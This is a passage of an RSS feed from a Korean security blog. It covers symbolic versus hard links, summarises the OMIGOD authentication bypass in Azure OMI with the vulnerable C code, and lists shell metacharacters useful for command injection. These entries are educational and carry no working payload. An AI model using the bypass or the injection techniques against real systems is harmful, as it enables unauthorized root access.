&#xC774;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC124;&#xCE58;, &#xC0AD;&#xC81C;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="&#xD558;&#xB4DC;-&#xB9C1;&#xD06C;&#xC640;-&#xC2EC;&#xBCFC;&#xB9AD;-&#xB9C1;&#xD06C;"><a href="#&#xD558;&#xB4DC;-&#xB9C1;&#xD06C;&#xC640;-&#xC2EC;&#xBCFC;&#xB9AD;-&#xB9C1;&#xD06C;" class="headerlink" title="&#xD558;&#xB4DC; &#xB9C1;&#xD06C;&#xC640; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;"></a>&#xD558;&#xB4DC; &#xB9C1;&#xD06C;&#xC640; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;</h3><p><img src="/2021/10/01/poosic/symbolic-link/image3.png" alt></p><p>&#xD558;&#xB4DC; &#xB9C1;&#xD06C;&#xB294; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xC640; &#xBE44;&#xC2B7;&#xD55C; &#xB9C1;&#xD06C; &#xBC29;&#xC2DD; &#xD639;&#xC740; &#xD30C;&#xC77C;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xCC28;&#xC774;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB294; Linux &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xC640; &#xD558;&#xB4DC;&#xB9C1;&#xD06C;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC791;&#xB3D9;&#xD558;&#xB294;&#xC9C0; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA70; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xB0B4;&#xBD80;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xB294; &#xC911;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xC790;&#xB8CC;&#xAD6C;&#xC870;&#xC778; inode &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xC2DC; &#xB530;&#xB85C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC5B4; File Pointer&#xB97C; &#xB530;&#xB77C; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xC9C0;&#xB9CC; &#xD558;&#xB4DC;&#xB9C1;&#xD06C; &#xD30C;&#xC77C;&#xC740; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; inode &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xBA70; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; &#xD30C;&#xC77C;&#xC740; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xC774; &#xC0AD;&#xC81C;&#xB41C;&#xB2E4;&#xBA74; &#xC81C; &#xAE30;&#xB2A5;&#xC744; &#xBABB; &#xD558;&#xC9C0;&#xB9CC; &#xD558;&#xB4DC; &#xB9C1;&#xD06C; &#xD30C;&#xC77C;&#xC740; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xC774; &#xC0AD;&#xC81C;&#xB418;&#xB354;&#xB77C;&#xB3C4; &#xAC19;&#xC740; inode &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC0AC;&#xB77C;&#xC9C0;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xAE30;&#xB2A5;&#xC744; &#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, &#xD558;&#xB4DC;&#xB9C1;&#xD06C;&#xB294; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xC640; &#xB2EC;&#xB9AC; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xC744; &#xCC38;&#xC870;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC218;&#xC815;, &#xC0AD;&#xC81C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xC9C1;&#xC811; &#xC218;&#xC815;, &#xC0AD;&#xC81C;&#xB97C; &#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/symbolic-link/">symbolic link</category>
      
      <category domain="https://hackyboiz.github.io/tags/hard-link/">hard link</category>
      
      
      <comments>https://hackyboiz.github.io/2021/10/01/poosic/symbolic-link/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] OMIGOD: Microsoft Azure의 OMI에서 발견된 네 가지 취약점</title>
      <link>https://hackyboiz.github.io/2021/09/30/l0ch/2021-09-30/</link>
      <guid>https://hackyboiz.github.io/2021/09/30/l0ch/2021-09-30/</guid>
      <pubDate>Thu, 30 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.wiz.io/blog/omigod-critical-vulnerabilities-i</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure">OMIGOD: Critical Vulnerabilities in OMI Affecting Countless Azure Customers</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OMI (undocumented) </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft&#xC758; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xCEF4;&#xD4E8;&#xD305; &#xD50C;&#xB7AB;&#xD3FC; Azure&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC624;&#xD508; &#xAD00;&#xB9AC; &#xC778;&#xD504;&#xB77C;(OMI)&#xC758; &#xB124; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. OMI&#xB294; &#xB9AC;&#xB205;&#xC2A4; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC124;&#xC815; &#xAD00;&#xB9AC; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC73C;&#xB85C;, &#xC6D0;&#xACA9; &#xBC0F; &#xB85C;&#xCEEC; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xAC00;&#xC0C1; &#xBA38;&#xC2E0;&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xC815; &#xBC0F; &#xD1B5;&#xACC4; &#xC790;&#xB8CC;&#xB97C; &#xC218;&#xC9D1;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; OMIGOD&#xC73C;&#xB85C; &#xBA85;&#xBA85;&#xB418;&#xC5C8;&#xC73C;&#xBA70; Azure&#xC758; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810; &#xBAA9;&#xB85D;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>CVE-2021-38647 &#x2013; root &#xAD8C;&#xD55C;&#xC758; RCE</li><li>CVE-2021-38648 &#x2013; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;</li><li>CVE-2021-38645 &#x2013; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;</li><li>CVE-2021-38649 &#x2013; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;</li></ul><p>&#xC544;&#xB798;&#xB294; &#xC704; &#xCDE8;&#xC57D;&#xC810;&#xB4E4; &#xC911; CVE-2021-38647&#xC758; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC5B4; &#xCE58;&#xBA85;&#xC801;&#xC778; &#xC704;&#xD5D8;&#xB3C4;&#xB85C; &#xBD84;&#xB958;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. OMI&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xBA70; POST &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xC694;&#xCCAD;&#xD55C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">static</span> Http_CallbackResult _ReadData(Http_SR_SocketData* handler){....    <span class="hljs-keyword">if</span>(handler-&gt;recvHeaders.authorization) { <span class="hljs-comment">// (1)</span>        Http_CallbackResult authorized;        handler-&gt;requestIsBeingProcessed = MI_TRUE;        <span class="hljs-keyword">if</span> (handler-&gt;isAuthorised)            Deauthorize(handler);         authorized = IsClientAuthorized(handler);        <span class="hljs-keyword">if</span> (PRT_RETURN_FALSE == authorized)            <span class="hljs-keyword">goto</span> Done;        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (PRT_CONTINUE == authorized)            <span class="hljs-keyword">return</span> PRT_CONTINUE;    }    <span class="hljs-keyword">else</span>{        <span class="hljs-keyword">if</span> (handler-&gt;authFailed) {   <span class="hljs-comment">// (2)</span>            handler-&gt;httpErrorCode = HTTP_ERROR_CODE_UNAUTHORIZED;            <span class="hljs-keyword">return</span> PRT_RETURN_FALSE;        }    }    r = Process_Authorized_Message(handler);Done:    handler-&gt;recvPage = <span class="hljs-number">0</span>;    handler-&gt;receivedSize = <span class="hljs-number">0</span>;    <span class="hljs-built_in">memset</span>(&amp;handler-&gt;recvHeaders, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(handler-&gt;recvHeaders));    handler-&gt;recvingState = RECV_STATE_HEADER;    <span class="hljs-keyword">return</span> PRT_CONTINUE;}</code></pre><p>&#xC720;&#xC800;&#xAC00; &#xC11C;&#xBC84;&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xBA74; <code>uid</code>&#xC640; <code>gid</code>&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; <code>memset</code>&#xC744; &#xC774;&#xC6A9;&#xD574; 0&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xACE0; &#xC778;&#xC99D;&#xC744; &#xAE30;&#xB2E4;&#xB9BD;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; POST &#xC694;&#xCCAD;&#xC758; <code>Authorization</code> &#xD544;&#xB4DC;&#xC758; &#xC554;&#xD638;&#xB85C; &#xC778;&#xC99D;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; <code>gid</code>&#xC640; <code>uid</code>&#xB97C; &#xD574;&#xB2F9; &#xC720;&#xC800;&#xC758; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD55C; &#xB4A4; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; <code>Authorization</code> &#xD5E4;&#xB354;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; (1)&#xC758;<code>recvHeaders.authorization</code> &#xAC00; False&#xAC00; &#xB418;&#xC5B4; else&#xBB38;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xC9C0;&#xB9CC; &#xC778;&#xC99D; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; (2)&#xC5D0;&#xC11C; <code>handler-&gt;authFailed</code> &#xB610;&#xD55C; &#xAE30;&#xBCF8;&#xAC12;&#xC778; False&#xC774;&#xBBC0;&#xB85C; &#xC778;&#xC99D; &#xC131;&#xACF5; &#xC2DC; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xBD84;&#xAE30;&#xB85C; &#xB118;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>Authorization</code> &#xD5E4;&#xB354;&#xB97C; &#xC81C;&#xAC70;&#xD55C; &#xBA85;&#xB839;&#xC5B4; &#xC2E4;&#xD589; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; &#xC778;&#xC99D; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xAC74;&#xB108;&#xB6F0;&#xACE0; <code>memset</code>&#xC5D0; &#xC758;&#xD574; 0&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB41C; <code>gid</code>&#xC640; <code>uid</code>, &#xC989; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810; &#xC678; 3&#xAC1C;&#xC758; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC778; CVE-2021-38645/38648/38649 &#xB610;&#xD55C; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; OMI&#xC758; &#xC778;&#xC99D; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC73C;&#xB85C; &#xC790;&#xC138;&#xD55C; &#xC815;&#xBCF4;&#xB294; <a href="https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure">URL</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/azure/">azure</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/privilege-escalation/">privilege escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication-bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/30/l0ch/2021-09-30/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Linux Command Injection에서 활용할 수 있는 metacharacters</title>
      <link>https://hackyboiz.github.io/2021/09/29/y00n_nms/linux-metacharacters/</link>
      <guid>https://hackyboiz.github.io/2021/09/29/y00n_nms/linux-metacharacters/</guid>
      <pubDate>Wed, 29 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Linux&amp;#xC758; Command Injection &amp;#xACF5;&amp;#xACA9;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC5EC;&amp;#xB7EC; metacharacters&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Linux&#xC758; Command Injection &#xACF5;&#xACA9;&#xC5D0;&#xC11C;&#xB294; &#xC5EC;&#xB7EC; metacharacters&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xB2E4;&#xC911; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; metacharacters</li></ul><p>&#xD55C; &#xC904;&#xC5D0; &#xC5EC;&#xB7EC; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC55E;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xBD80;&#xD130; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xC9C0;&#xB9CC; &#xAC01;&#xAC01;&#xC758; &#xADDC;&#xCE59;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>;</code> (Command sequence) : &#xC55E;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC131;&#xACF5; &#xC5EC;&#xBD80;&#xC640; &#xC0C1;&#xAD00; &#xC5C6;&#xC774; &#xB2E4;&#xC74C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>cat Hacking_JJack.txt ; cat Hackyboiz.txt</code> &#xBA85;&#xB839;&#xC5B4;&#xB85C; <code>Hacking_JJack.txt</code> &#xD30C;&#xC77C;&#xC744; &#xCD9C;&#xB825;&#xD55C; &#xD6C4; &#xC774;&#xC5B4;&#xC11C; <code>Hackyboiz.txt</code> &#xD30C;&#xC77C;&#xC744; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/29/y00n_nms/linux-metacharacters/image.png" alt="image"></p><p><code>&amp;&amp;</code> (AND conditional execution) : &#xC55E;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC2E4;&#xD328;&#xD558;&#xBA74; &#xB2E4;&#xC74C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>cat Hacking_JJack.txt &amp;&amp; cat Hackyboiz.txt</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xC9C0;&#xB9CC;, &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; <code>fake.txt</code> &#xD30C;&#xC77C;&#xB85C; <code>cat fake.txt &amp;&amp; cat Hackyboiz.txt</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; <code>cat fake.txt</code>&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC73C;&#xBA70; &#xC774;&#xD6C4;&#xC758; &#xBA85;&#xB839;&#xB3C4; &#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/29/y00n_nms/linux-metacharacters/image1.png" alt="image1"></p><p><code>||</code> (OR conditional execution): &#xC55E;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xB2E4;&#xC74C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>cat Hacking_JJack.txt || cat Hackyboiz.txt</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; <code>cat Hacking_JJack.txt</code> &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB41C; &#xC774;&#xD6C4; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;. &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; <code>fake.txt</code> &#xD30C;&#xC77C;&#xB85C; <code>cat fake.txt || cat Hackyboiz.txt</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC55E;&#xC758; &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD328;&#xB41C; &#xC774;&#xD6C4;&#xC5D0; <code>cat Hackyboiz.txt</code> &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/29/y00n_nms/linux-metacharacters/image2.png" alt="image2"></p><p><code>&amp;</code> (Run command in the background) : &#xC55E;&#xC758; &#xBA85;&#xB839;&#xC744; &#xBC31;&#xADF8;&#xB77C;&#xC6B4;&#xB4DC;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xB2E4;&#xC74C;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>mkdir yoon &amp; cd yoon</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; <code>mkdir yoon</code> &#xBA85;&#xB839;&#xC774; &#xBC31;&#xADF8;&#xB77C;&#xC6B4;&#xB4DC;&#xB85C; &#xC2E4;&#xD589;&#xB428;&#xACFC; &#xB3D9;&#xC2DC;&#xC5D0; <code>cd yoon</code> &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. <code>cd yoon</code> &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB420; &#xB54C; &#xC544;&#xC9C1; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2E4;&#xD328;&#xD558;&#xACE0; &#xC774;&#xD6C4;&#xC5D0; &#xD574;&#xB2F9; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/29/y00n_nms/linux-metacharacters/image3.png" alt="image3"></p><ul><li>&#xD30C;&#xC77C;&#xC758; &#xC804;&#xCCB4; &#xC774;&#xB984;&#xC744; &#xC54C;&#xC9C0; &#xBABB;&#xD574;&#xB3C4; &#xC720;&#xCD94;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC640;&#xC77C;&#xB4DC;&#xCE74;&#xB4DC; metacharacters</li></ul><p><code>*</code> (File substitution wildcard; zero or more characters) : &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC758; &#xC77C;&#xBD80;&#xB97C; <code>*</code>&#xB85C; &#xB300;&#xCCB4;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/29/y00n_nms/linux-metacharacters/image4.png" alt="image4"></p><p><code>?</code> (File substitution wildcard; one character) : &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC758; &#xD55C; &#xAE00;&#xC790;&#xB97C; <code>?</code>&#xB85C; &#xB300;&#xCCB4;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/29/y00n_nms/linux-metacharacters/image5.png" alt="image5"></p><ul><li>&#xC55E;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC2E4;&#xD589; &#xACB0;&#xACFC;&#xB97C; &#xB2E4;&#xC74C; &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xB294; metacharacters</li></ul><p><code>|</code> (Pipe) : &#xC55E;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC2E4;&#xD589; &#xACB0;&#xACFC;&#xAC00; &#xB2E4;&#xC74C; &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>ls -al | grep &quot;\\.txt&quot;</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; <code>ls -al</code> &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xCD9C;&#xB825;&#xC774; <code>grep</code> &#xBA85;&#xB839;&#xC758; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xC5B4; <code>.txt</code> &#xD615;&#xC2DD;&#xC758; &#xD30C;&#xC77C; &#xBAA9;&#xB85D;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/29/y00n_nms/linux-metacharacters/image6.png" alt="image6"></p><p><code>&gt;</code> (Output redirection) : &#xC55E;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC2E4;&#xD589; &#xACB0;&#xACFC;&#xB97C; &#xB4A4;&#xC5D0; &#xC785;&#xB825;&#xB418;&#xB294; &#xD30C;&#xC77C;&#xB85C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>echo &quot;lol&quot; &gt; lol.txt</code> &#xBA85;&#xB839;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74; <code>lol.txt</code> &#xD30C;&#xC77C;&#xC5D0; lol&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/29/y00n_nms/linux-metacharacters/image7.png" alt="image7"></p><p><code>&gt;&gt;</code> (Output redirection; append): &#xC55E;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC2E4;&#xD589; &#xACB0;&#xACFC;&#xB97C; &#xB4A4;&#xC5D0; &#xC785;&#xB825;&#xB418;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xC5C6;&#xB2E4;&#xBA74; &#xC0DD;&#xC131;&#xD558;&#xACE0;(<code>&gt;</code>&#xACFC; &#xB3D9;&#xC77C;) &#xC788;&#xB2E4;&#xBA74; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/29/y00n_nms/linux-metacharacters/image8.png" alt="image8"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/command-injection/">command injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/metacharacters/">metacharacters</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/29/y00n_nms/linux-metacharacters/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] macOS Finder RCE</title>
      <link>https://hackyboiz.github.io/2021/09/28/fabu1ous/2021-09-28/</link>
